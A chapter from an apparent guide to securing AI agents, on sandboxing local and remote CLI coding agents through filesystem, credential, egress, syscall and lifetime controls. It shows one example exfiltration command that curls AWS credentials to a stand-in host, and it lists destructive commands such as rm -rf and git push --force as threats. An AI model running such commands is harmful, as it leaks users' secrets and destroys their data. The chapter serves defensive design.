# Chapter 5 — Sandboxing Local and Remote CLI Agents

The most powerful — and most dangerous — tool you can give an agent is the ability to run code. A CLI agent that can execute shell commands, write files, and make network calls is, by construction, capable of arbitrary destructive action and arbitrary data exfiltration. The only thing standing between "useful coding agent" and "ransomware with a chat interface" is the sandbox. This chapter designs that sandbox for the two topologies you will ship: a **local** agent on a developer's machine, and a **remote** agent running in your infrastructure.

## The threat: destructive action and data leakage

Two failure modes dominate, and both are realized through the same code-execution tool:

- **Destructive action.** `rm -rf`, dropping a production table, `git push --force`, deleting cloud resources. Often *not* malicious — an over-eager agent following a plausible-looking plan, or one fooled by injection (Chapter 2).
- **Data leakage.** The agent reads secrets from the environment, an `.env` file, or a credential cache, and exfiltrates them over the network — `curl evil.example --data @~/.aws/credentials`.

The sandbox's two jobs map directly onto these: **constrain what the code can touch** (filesystem, processes, credentials) and **constrain where it can talk** (egress). Get both, and a hijacked code tool has nowhere to do damage and nowhere to send loot.

## Sandbox dimensions

Design every code-executing agent against this checklist; each row is a containment boundary:

| Dimension | Control |
|-----------|---------|
| **Filesystem** | Read-only base image; a single writable scratch dir; no host mounts of secrets, SSH keys, or credential caches. |
| **Credentials** | No ambient secrets in the environment. Tokens injected per-call by a broker (Chapter 4), never resident in the sandbox. |
| **Network egress** | Default-deny. Explicit allowlist of hosts the task legitimately needs. This is what stops exfiltration even after injection. |
| **Process / syscall** | Drop Linux capabilities, no privilege escalation (`no-new-privileges`), seccomp profile; non-root user. |
| **Resources** | CPU, memory, PID, and wall-clock limits so a runaway or fork-bomb is bounded. |
| **Lifetime** | Ephemeral: fresh sandbox per task or session; destroyed after, leaving no persistent foothold. |

```text
              ┌──────────────────────────────────────────┐
              │  ephemeral sandbox (container / microVM)  │
   task ────▶ │  ┌────────────┐                           │
              │  │ CLI agent  │  fs: ro base + scratch    │
              │  │  + code    │  creds: none resident     │
              │  └─────┬──────┘  user: non-root, seccomp  │
              │        │ egress (default-deny)            │
              └────────┼──────────────────────────────────┘
                       ▼
                 ┌───────────────┐   only allowlisted hosts
                 │ egress proxy  │ ─────────────────────────▶ pkg registry, internal API
                 └───────────────┘   evil.example → BLOCKED
```

## Local vs. remote topologies

The principles are identical; the enforcement differs.

**Remote (your infra).** You control the runtime, so use real isolation: a container with the hardening above, or a microVM (gVisor, Firecracker, Kata) when you need a stronger kernel boundary against untrusted code. Run an **egress proxy** that enforces the host allowlist and logs every connection. Mount no production credentials; broker tokens in per call. This is the topology you can make genuinely strong.

**Local (developer's machine).** Harder, because the agent runs *on a machine full of secrets and powerful tools* — SSH keys, cloud CLIs, the developer's own credentials. You cannot fully isolate from the host the way you can remotely, so:

- Run the agent in a **container or dev-VM**, not directly on the host, with only the project directory mounted.
- Default to an **allowlist of commands** and require explicit approval (Chapter 3) for anything outside it — especially destructive verbs (`rm`, `git push`, `kubectl delete`) and anything touching `~/.ssh`, `~/.aws`, `~/.config`.
- Keep **egress controlled** even locally; a compromised local agent exfiltrating the developer's credentials is the worst case.
- **Never auto-approve** destructive or credential-touching commands; "fast" is not worth a wiped repo or leaked keys.

## Defense in depth, not a single wall

No single control is sufficient. The egress allowlist stops exfiltration *if* the agent is contained; the filesystem read-only-ness stops destruction *if* egress somehow leaks; the no-resident-credentials rule means even a full escape finds nothing to steal. Layer them so an escape from any one boundary still lands inside another. And log everything the sandbox does — the trace is both your incident forensics and the input to the adversarial testing in Chapter 6.

## Key takeaways

- Code execution is the highest-blast-radius tool; its two threats are destructive action and data leakage, and the sandbox exists to contain both.
- Sandbox every dimension: read-only filesystem, no resident credentials, default-deny egress, dropped privileges, resource caps, ephemeral lifetime.
- Remote agents get strong isolation (hardened containers / microVMs + egress proxy); local agents run in a container/VM with command allowlists and approval on destructive or credential-touching commands.
- Layer the controls so escaping one boundary lands inside another, and log all sandbox activity for forensics and red-teaming.
